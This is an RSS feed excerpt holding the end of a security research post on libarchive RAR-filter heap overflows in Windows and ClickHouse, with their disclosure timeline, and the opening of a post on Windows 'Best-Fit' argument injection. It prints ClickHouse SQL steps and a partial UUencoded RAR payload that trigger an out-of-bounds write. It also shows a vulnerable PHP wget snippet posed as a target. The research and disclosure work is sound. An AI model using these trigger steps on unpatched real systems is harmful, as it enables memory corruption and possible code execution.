&lt;p&gt;After RAR v5, filters became an enum type in the file format, making it possible to use only pre-defined filters. This can be observed in the &lt;a href=&quot;https://www.rarlab.com/rar_add.htm&quot;&gt;UnRAR source&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FilterType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// These values must not be changed, because we use them directly&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// in RAR5 compression and decompression code.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_DELTA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_E8E9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ARM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;FILTER_AUDIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_RGB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_ITANIUM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FILTER_TEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
  
  &lt;span class=&quot;c1&quot;&gt;// These values can be changed.&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;FILTER_LONGRANGE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_EXHAUSTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FILTER_NONE&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;code-review&quot;&gt;Code Review&lt;/h4&gt;

&lt;p&gt;The concept of filters is interesting, and the vulnerabilities that Microsoft found are also related to the filter. So, we conducted a code review of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After some time, we discovered a heap buffer overflow vulnerability in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; parameter of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; is used directly in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memcpy&lt;/code&gt; without any checks, while the buffer size is only 0x40004 bytes:
&lt;img src=&quot;/assets/img/blog/20250212/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the places where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window&lt;/code&gt; is called, it can be observed that the function is used to copy data into the VM memory:
&lt;img src=&quot;/assets/img/blog/20250212/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability itself is straightforward, but constructing a valid filter and data is a bit more complex. These elements are not immediately presented in the RAR file format, they are actually part of the data. Additionally, the data is encoded using Huffman coding, and it isnâ€™t consumed byte by byte, but rather 7 bits at a time. Since this is not the focus of this article, we wonâ€™t delve into the details here, but we encourage readers to attempt reproducing the vulnerability.
&lt;img src=&quot;/assets/img/blog/20250212/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability is &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26256&quot;&gt;CVE-2024-26256&lt;/a&gt;. The reason it was not detected by fuzzing is straightforward: the data must be exactly the same size as the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter-&amp;gt;blocklength&lt;/code&gt;. However, fuzzers often trim files when their coverage is similar.&lt;/p&gt;

&lt;h3 id=&quot;half-day-a-1-day-that-looks-like-a-0-day&quot;&gt;Half-Day: A 1-Day That Looks Like a 0-Day&lt;/h3&gt;

&lt;p&gt;When we mentioned earlier the two vulnerabilities the Microsoft Offensive Research Security Engineering (MORSE) team reported, we said that constructing a PoC is a little complex. Perhaps someone immediately thought, â€œWhy not check the GitHub repository of libarchive for test cases or commit messages?â€ Well, we did lookâ€”there was nothing.&lt;/p&gt;

&lt;p&gt;Because, at that time, libarchive hadnâ€™t even been patched yet, or perhaps no one even knew the vulnerabilities existed! We can see that Microsoft had already fixed the libarchive fork used in Windows back in January:
&lt;img src=&quot;/assets/img/blog/20250212/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the corresponding two patches for libarchive were merged in May and April, respectively:
&lt;img src=&quot;/assets/img/blog/20250212/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wouldnâ€™t it mean that anyone who has been closely following Windows patches would immediately discover that there were two unpatched vulnerabilities in the libarchive upstream? These vulnerabilities would be considered 1-day for the Windows forked version of libarchive, because they have been discovered and patched. However, for libarchive upstream, they are 0-day, as no patch has been made, and the maintainers may even be unaware of the issue! We will refer to this situation as â€œ0.5-dayâ€ or â€œHalf-dayâ€ in the rest of the article.&lt;/p&gt;

&lt;p&gt;So, we began searching for large projects that use libarchive. We wanted to simulate a â€œHalf-day attackâ€ scenario and also believed that vendors incorporating libarchive in their software would be more willing to help us urge libarchive to patch the vulnerabilities.&lt;/p&gt;

&lt;h3 id=&quot;attacking-clickhouse&quot;&gt;Attacking ClickHouse&lt;/h3&gt;

&lt;p&gt;After some investigation, we discovered that ClickHouse uses libarchive for decompression, which likely contains the vulnerable code. In ClickHouse, we can interact with the data inside the archive through the file table engine:
&lt;img src=&quot;/assets/img/blog/20250212/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the manual also mentions that ClickHouse only supports zip, tar, and 7z file formats:
&lt;img src=&quot;/assets/img/blog/20250212/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But is that really the case? Aside from zip, both tar and 7z in ClickHouse are implemented by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TarArchiveReader&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SevenZipArchiveReader&lt;/code&gt;, both of which inherit from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt;. The behavior of opening files with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LibArchiveReader&lt;/code&gt; is implemented in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt; function. In the &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/blob/0bd3016a17dab23e64a7e550b2754ce7f7aa1d82/src/IO/Archives/LibArchiveReader.cpp#L150&quot;&gt;source code&lt;/a&gt;, you can see the familiar pattern:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path_to_archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;archive_read_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_filter_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;archive_read_support_format_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;archive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, ClickHouse also uses theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt;Â and theÂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt;Â to initialize the libarchive, which means we can trigger the vulnerabilities relative to RAR! All we need to do next is have ClickHouse decompress the files for us. Although the current decompression feature allows direct access to files on S3,Â &lt;strong&gt;it could not be used this way at the time&lt;/strong&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, we must upload the file first. The following query will create a new table, which will be stored as a file:&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Native&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;payload&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Even so, the file generated this way would include the tableâ€™s metadata. With the metadata present, we cannot make libarchive treat it as a RAR file, thus preventing the vulnerability from being triggered:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000: 0101 0763 6f6c 756d 6e31 0653 7472 696e  ...column1.Strin
00000010: 6707 7061 796c 6f61 64                   g.payload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We needed to look for formats in ClickHouseâ€™s Output Data Formats that dontâ€™ have metadata at the beginning of the file. We decided to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; because in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Data is stored row by row.&lt;/li&gt;
  &lt;li&gt;Data within a row is separated by tabs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For example, if using the following two queries:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row1 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;row2 string&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The content of the generated file would be:&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;row1 string
row2 string
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nonetheless, there is a constraint: the data cannot contain tabs or newlines.
If we can overcome this, we can construct a valid RAR file! So, how can we avoid using tabs or newlines? It sounds complicated, but donâ€™t forget that ClickHouse calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; to enable all filters for us! The one that fits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TabSeparatedRaw&lt;/code&gt; the most is UUencode. Data that has been UUencoded would look like this:&lt;/p&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;begin 600 exploit.rar.uu
M4F%R(1H&apos;`,^0&amp;lt;P``#0````````!287(A&amp;amp;@&amp;lt;`SY!S```-`````````%VI=(&quot;0
M,0&quot;VXP0`4,\+``(2&apos;^X4O1EY5QTU#``@````;7-V8W(Q,#`N9&amp;amp;QL`/#&amp;lt;ZFP8
M(AE0S(EB&apos;!(&quot;,EM(4I0M-&quot;H*&quot;T6JBHJ!1$1T%IKHFBA0H*:(VV2VP)98R9+*
M&quot;*`T&apos;I;&amp;amp;]1&amp;gt;J]&amp;gt;HZ!&amp;gt;KU4=(ZQTC:4VHB@J4WH2D-%--VSX9S);9IOO.9HF2E
MH47O?/GG[Y^6LSGO/&amp;gt;&amp;gt;Z&amp;gt;&amp;gt;\]YJS!N3_(^_P3SS&quot;O\S`P+6&amp;lt;_V&apos;P(,#`P,#`B
M.EX#-(,!V$Z07A+LVZ?4@K:RB=`NN&amp;lt;+9(IB&amp;lt;?NX``Y[L`3`P,#``,`&apos;/YCL*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, all we need to do next is UUEncode the original RAR payload and then upload it:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FUNCTION&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;poc.7z&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;TabSeparatedRaw&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;column1 String&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;VALUES&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uu_encoded_rar_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ask ClickHouse to decompress it for us:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM file(&apos;poc.7z :: **&apos;, RawBLOB)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That would successfully trigger the out-of-bounds write vulnerability:
&lt;img src=&quot;/assets/img/blog/20250212/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We reported those issues to the Bug Bounty program of ClickHouse on Bugcrowd:
&lt;img src=&quot;/assets/img/blog/20250212/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ClickHouse quickly &lt;a href=&quot;https://github.com/ClickHouse/ClickHouse/commit/c8a3a0bb11ad1344fbb50b10f50f8eb2a962aa7f&quot;&gt;fixed&lt;/a&gt; the issue and was willing to help us urge libarchive to patch the vulnerabilities! While itâ€™s unclear whether Microsoft informed the libarchive maintainers about the CVE-2024-20696 and CVE-2024-20697 vulnerabilities (since thereâ€™s no public information, and the &lt;a href=&quot;https://github.com/libarchive/libarchive/security/advisories?state=draft&quot;&gt;Security Advisories&lt;/a&gt; on libarchiveâ€™s GitHub repository have no relevant details), as we mentioned earlier, these two vulnerabilities, initially discovered by Microsoft in the forked version of libarchive, were eventually patched in libarchive in May and April, ending the awkward â€œHalf-dayâ€  situation.&lt;/p&gt;

&lt;h3 id=&quot;issue-tracking&quot;&gt;Issue Tracking&lt;/h3&gt;

&lt;p&gt;In addition to reporting the two â€œHalf-dayâ€ vulnerabilities mentioned earlier, donâ€™t forget that we also reported three other 0-day vulnerabilities, each of which is as follows:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;RCE fixed by Microsoft: CVE-2024-26256
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 4/27&lt;/li&gt;
      &lt;li&gt;Fixed on 8/14&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OOB read in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_audio&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 3/20&lt;/li&gt;
      &lt;li&gt;Fixed on 4/29&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OOB read in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_delta&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 3/20&lt;/li&gt;
      &lt;li&gt;Fixed on 4/29&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After several months following the reports, these vulnerabilities were finally patched, by which time it was already September.
&lt;img src=&quot;/assets/img/blog/20250212/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;the-half-day-cycle-of-repetition&quot;&gt;The â€œHalf-dayâ€ Cycle of Repetition&lt;/h4&gt;

&lt;p&gt;The most severe one is CVE-2024-26256, a vulnerability we reported to Microsoft, which was already patched on Windows in April.
&lt;img src=&quot;/assets/img/blog/20250212/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we reported the vulnerability CVE-2024-26256 in March, we asked MSRC whether they would submit the patch to libarchiveâ€™s GitHub repository, but we didnâ€™t receive a response initially. After Microsoft patched CVE-2024-26256, we followed up to confirm if they had shared the vulnerability information with libarchive maintainers. MSRC replied, â€œIf you wish, we encourage you to open a separate GitHub issue.â€ To avoid a â€œHalf-dayâ€ situation, we immediately created an issue in libarchiveâ€™s Security Advisory after receiving their message:
&lt;img src=&quot;/assets/img/blog/20250212/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the â€œHalf-dayâ€ situation still occurred due to a lack of response. In July, we submitted a PR to port Microsoftâ€™s patch to libarchive. While we werenâ€™t sure if this was the best fix, it was certainly better than leaving the issue unaddressed. As a result, history repeated itself, and we found ourselves stuck in a â€œHalf-dayâ€ scenario again, from April until the patch was finally completed in September.&lt;/p&gt;

&lt;h4 id=&quot;the-remaining-two-0-days&quot;&gt;The Remaining Two 0-Days&lt;/h4&gt;

&lt;p&gt;Attentive readers may have already noticed that the issues we reported are not listed under the â€œPublishedâ€ tab but rather under â€œClosedâ€:
&lt;img src=&quot;/assets/img/blog/20250212/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to CVE-2024-26256, which we mentioned earlier, the other two vulnerabilities are out-of-bounds read issues that had not been assigned CVE identifiers at the time. When a patch is linked to an existing CVE number, it is generally understood to be a security fix. However, the other two vulnerabilities were not publicly disclosed. Given that libarchive is widely used across many software applications and services, many users may be unaware they are relying on it. The dependency chains within such software can be large and intricate. If developers or end-users do not recognize that a patch addresses a security issue, the fix may propagate slowly through the dependency chain, significantly increasing the risk exposure.&lt;/p&gt;

&lt;p&gt;As a result, after confirming that libarchive had closed the issue, we promptly applied for CVE identifiers for these vulnerabilities. The two vulnerabilities were assigned &lt;a href=&quot;https://github.com/advisories/GHSA-rmj4-vvpv-4m33&quot;&gt;CVE-2024-48957&lt;/a&gt; and &lt;a href=&quot;https://github.com/advisories/GHSA-9mw4-2ppr-4mcg&quot;&gt;CVE-2024-48958&lt;/a&gt;. By the time these were published, it was already October, six months after the patch had been released in April.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This article discusses the vulnerabilities and notable characteristics introduced when Windows adopted libarchive to support additional archive file formats.&lt;/p&gt;

&lt;p&gt;We also successfully exploited what we consider â€œHalf-dayâ€ vulnerabilities in ClickHouse. These â€œHalf-dayâ€ vulnerabilities arise from the fact that after Windows forked libarchive and compiled it into the closed-source archiveint.dll, it failed to promptly inform the libarchive maintainers or contribute the patch back to the upstream repository, leading to the creation of the â€œHalf-dayâ€ vulnerability.&lt;/p&gt;

&lt;p&gt;The delayed fix in the upstream repository can be attributed to communication delays and the absence of a publicly available patch. The maintainers were only able to address the issue after receiving the report, by which point the forked version had already been patched. Therefore, after patching its forked version of libarchive, Microsoft should have not only notified the original maintainers but also submitted a Pull Request to the upstream repository to facilitate the fix.&lt;/p&gt;

&lt;p&gt;Libarchive maintainers are volunteers who may be unpaid. The open-source ethos encourages everyone to â€œshare, collaborate, and contributeâ€ (and much more). Thus, we believe that researchers should not only provide vulnerability analysis and PoCs but also actively propose fixes to help preserve the security and quality of open-source software when reporting vulnerabilities.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en/</link>
                <guid>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en</guid>
                <pubDate>Wed, 12 Feb 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI!</title>
                <description>&lt;style&gt;
    .language-plaintext {
        background-color: rgba(0, 0, 0, 0.04);
        padding: 0.2em;
        font-size: 85%;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;&lt;em&gt;Author: &lt;a href=&quot;https://x.com/orange_8361&quot;&gt;Orange&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://x.com/_splitline_&quot;&gt;Splitline&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The research unveils a new attack surface in Windows by exploiting &lt;strong&gt;Best-Fit&lt;/strong&gt;, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!&lt;/p&gt;

&lt;p&gt;Given that the root cause spans compiler behavior, C/C++ runtime and developerâ€™s mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.&lt;/p&gt;

&lt;p&gt;Get the latest update and slides on our website!ğŸ”¥ â†’ &lt;a href=&quot;https://worst.fit/&quot;&gt;https://worst.fit/&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Letâ€™s imagine that: youâ€™re a pentester, and your target website is running the following code. Can you pop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; with that? &lt;!-- You can have a quick try on your own. --&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?&lt;/p&gt;

&lt;p&gt;Well, today, we would like to present a new technique to break through it!&lt;/p&gt;

